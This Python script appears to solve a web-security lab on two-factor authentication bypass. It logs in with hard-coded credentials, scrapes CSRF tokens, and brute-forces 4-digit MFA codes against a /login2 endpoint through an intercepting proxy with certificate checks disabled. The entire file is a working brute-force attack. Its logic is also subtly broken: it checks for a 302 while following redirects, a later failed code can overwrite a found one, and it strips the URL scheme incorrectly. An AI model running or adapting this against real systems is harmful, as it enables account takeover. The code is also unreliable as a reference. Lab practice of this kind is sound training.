from dataclasses import dataclass
import sys
from bs4 import BeautifulSoup
import requests
import bs4
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http":"https://127.0.0.1:8080","https":"https://127.0.0.1:8080"}

'''
Used to solve:
- 2FA bypass using a brute-force attack
- 2FA broken logic
'''

def main(site):
    i = 800
    output = False
    while i < 10000 and not output :
        #GET /login ; return login_data
        #print(f'[+] Logging in as carlos:montoya')
        s = requests.session()
        csrf = getlogin(site,s)
        #print(f'\t[+] csrf1: {csrf}')
        #POST /login (auto-redirects to /login2 - as if GET /login2); return login2_data
        csrf2 = postlogin(site,s,csrf)
        #print(f'\t[+] csrf2: {csrf2}')
        #POST /login2 ; 302 successful status code
        #print('\t[+] Brute mfa-code to /login2')
        for j in [0,1]:
            code = str(i+j).zfill(4)
            print(f'\t[+] i: {i} , j: {j} , Code: {code}')
            output = postlogin2(site,s,csrf2,code)
        i = i + 2

def getlogin(site,s):
    #GET /login ; return login_data
    login_url = f'https://{site}/login'
    resp = s.get(login_url,proxies=proxies,verify=False)
    soup = BeautifulSoup(resp.text,'html5lib')
    csrf = soup.find('input',{'name':'csrf'}).get('value')
    return csrf

def postlogin(site,s,csrf):
    #POST /login (auto-redirects to /login2 - as if GET /login2); return login2_data
    login_url = f'https://{site}/login'
    login_data = {
        'csrf' : csrf,
        'username' : 'carlos',
        'password' : 'montoya'
    }
    resp = s.post(login_url, data = login_data,allow_redirects=True,proxies=proxies,verify=False)
    soup = BeautifulSoup(resp.text,'html5lib')
    csrf2 = soup.find('input',{'name':'csrf'}).get('value')
    return csrf2

def postlogin2(site, s,csrf2,code):
    output = False
    login2_url = f'https://{site}/login2'
    #POST /login2, return 302 if successful
    login2_data = {
        'csrf' : csrf2,
        'mfa-code' : code
    }
    resp = s.post(login2_url, data=login2_data, allow_redirects=True,proxies=proxies,verify=False)
    if resp.status_code == 302:
        print(f'data={login2_data}; 2FA code valid with resp: {resp.status_code}')
        output = True
    return output

if __name__ == "__main__":
    site = sys.argv[1]
    if 'https://' in site:  
        site = site.rstrip('/').lstrip('https://')
        main(site)
    else:
        print('[-] Not a valid URL... http[s]://<url>... exiting!')
        sys.exit(-1)